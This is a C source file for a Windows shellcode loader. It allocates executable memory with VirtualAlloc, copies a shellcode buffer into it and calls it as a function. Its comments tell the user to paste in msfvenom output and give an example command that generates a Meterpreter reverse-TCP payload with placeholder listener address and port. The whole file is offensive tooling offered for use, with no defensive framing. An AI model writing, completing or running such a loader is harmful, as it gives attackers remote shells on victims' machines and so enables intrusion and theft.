#include <windows.h>  // Windows API functions (VirtualAlloc, CreateThread, etc.)
#include <stdio.h>    // Standard I/O (optional, here for consistency/debugging)

int main() {
  // ▼▼▼ Paste your entire msfvenom shellcode here ▼▼▼
  // For example: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f c -b "\x00"
  // unsigned char buf[] = ...
  
  // ▲▲▲ End of shellcode block ▲▲▲

  // Allocate memory for the shellcode using VirtualAlloc
  // MEM_COMMIT | MEM_RESERVE → reserve and commit memory
  // PAGE_EXECUTE_READWRITE   → memory is readable, writable, and executable
  void *mem = VirtualAlloc(
    NULL,                       // Let the OS choose the memory address
    sizeof(buf),                // Allocate enough space for the entire shellcode
    MEM_COMMIT | MEM_RESERVE,   // Memory allocation type
    PAGE_EXECUTE_READWRITE      // Memory protection flags
  );

  // Copy the shellcode into the allocated memory using memcpy
  memcpy(mem, buf, sizeof(buf));

  // Cast the shellcode memory to a function pointer and call it
  // This effectively jumps to and executes the shellcode
  ((void(*)())mem)();

  // Exit the loader process after execution
  return 0;
}
